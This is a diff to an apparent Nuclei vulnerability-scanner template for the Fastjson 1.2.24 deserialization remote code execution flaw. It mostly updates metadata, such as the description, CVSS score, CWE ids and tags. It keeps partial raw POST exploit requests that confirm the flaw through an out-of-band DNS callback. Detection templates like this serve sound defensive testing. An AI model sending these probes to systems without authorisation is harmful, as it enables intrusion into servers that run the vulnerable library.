@@ -1,16 +1,23 @@
 id: fastjson-1-2-24-rce
 
 info:
-  name: Fastjson 1.2.24 Deserialization RCE
+  name: Fastjson 1.2.24 - Remote Code Execution
   author: zh
   severity: critical
+  description: Fastjson 1.2.24 is susceptible to a deserialization remote code execution vulnerability.
   reference:
     - https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce
     - https://www.freebuf.com/vuls/208339.html
     - https://github.com/wyzxxz/fastjson_rce_tool
-  tags: fastjson,rce,deserialization,oast
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77,CWE-502
+  metadata:
+    max-request: 2
+  tags: fastjson,rce,deserialization,oast,vulhub,vuln
 
-requests:
+http:
   - raw:
       - |
         POST / HTTP/1.1
@@ -24,7 +31,6 @@ requests:
                 "autoCommit":true
             }
         }
-
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
@@ -37,10 +43,11 @@ requests:
         }
 
     stop-at-first-match: true
+
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol   # Confirms DNS Interaction
+        part: interactsh_protocol # Confirms DNS Interaction
         words:
           - "dns"
 
@@ -49,3 +56,4 @@ requests:
         words:
           - "Internal Server Error"
           - "500"
+# digest: 4b0a00483046022100926f10cb8aa0fcc2eb87e48440e3dafb7a321c8542835cb19b6d37255ab15def022100906444e4b44e5298c2ee45a0284196d0243a1ae2074da6d30b0c360c1a806c4e:922c64590222798bb761d5b6d8e72950
